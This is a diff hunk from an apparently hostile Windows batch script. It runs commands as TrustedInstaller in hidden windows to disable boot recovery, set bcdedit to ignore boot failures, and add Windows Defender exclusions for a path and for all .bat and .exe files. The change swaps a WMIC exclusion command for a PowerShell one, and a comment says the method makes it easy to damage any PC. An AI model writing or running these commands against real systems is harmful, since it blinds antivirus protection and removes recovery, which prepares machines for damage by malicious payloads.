@@ -100,7 +100,7 @@ NSudo -U:T -ShowWindowMode:Hide bcdedit /set {default} recoveryenabled No
 NSudo -U:T -ShowWindowMode:Hide bcdedit /set {default} bootstatuspolicy ignoreallfailures
 
 rem Exclusion in WD can be easily set with an elevated cmd, so that makes it super easy to damage any pc.
-WMIC /NAMESPACE:\\root\Microsoft\Windows\Defender PATH MSFT_MpPreference call Add ExclusionPath="xxxxxx
+powershell.exe -command "Add-MpPreference -ExclusionPath "xxxxxx""
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""
 
